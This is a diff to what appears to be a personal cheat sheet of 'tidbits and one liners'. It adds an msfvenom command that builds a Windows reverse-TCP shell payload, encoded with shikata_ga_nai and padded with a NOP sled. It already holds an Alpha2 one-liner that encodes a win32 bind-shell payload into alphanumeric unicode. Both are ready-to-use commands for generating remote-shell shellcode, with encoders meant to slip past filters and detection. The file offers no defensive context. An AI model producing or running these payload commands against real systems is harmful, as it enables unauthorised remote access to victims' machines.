@@ -1,6 +1,11 @@
 # References
 tidbits and one liners
 
+# MSFVENOM
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -n 20 -f hex
+```
+
 # Alpha2
 ```
 ./msfpayload win32_bind LPORT=4444 R |./alpha2 eax --unicode --uppercase
